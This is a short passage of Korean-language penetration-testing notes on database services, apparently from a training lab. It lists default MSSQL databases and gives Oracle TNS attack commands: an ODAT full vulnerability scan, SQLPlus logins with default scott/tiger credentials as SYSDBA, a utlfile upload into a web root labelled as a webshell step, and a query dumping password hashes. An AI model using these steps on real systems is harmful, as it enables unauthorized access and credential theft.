# 03. Database Services

## 🗄️ MSSQL (Microsoft SQL Server)

**포트**: 1433

### 기본 데이터베이스

MSSQL 설치 시 기본으로 생성되는 데이터베이스:

| 데이터베이스 | 용도 |
|-------------|------|
| `master` | 시스템 설정 및 메타데이터 |
| `model` | 새 데이터베이스의 템플릿 |
| `msdb` | SQL Server Agent, 백업, 작업 정보 |
| `tempdb` | 임시 데이터 저장 |
| `resource` | 시스템 객체 (숨김) |

---

## 🏛️ Oracle TNS (Transparent Network Substrate)

**포트**: 1521

### ODAT 도구 사용

```bash
# 모든 Oracle 취약점 테스트
sudo odat.py all -s 10.129.204.235

# Oracle Instant Client 라이브러리 설정
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

### SQLPlus 연결

```bash
# 일반 사용자로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid>

# SYSDBA 권한으로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid> as sysdba
```

### 파일 업로드 (웹쉘)

```bash
# utlfile을 이용한 파일 업로드
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

### 유용한 SQL 쿼리

```sql
-- 모든 테이블 조회
SELECT table_name FROM all_tables;

-- 현재 사용자의 권한 확인
SELECT * FROM user_role_privs;

-- 사용자 계정 및 해시 조회
SELECT name, password FROM sys.user$;
```
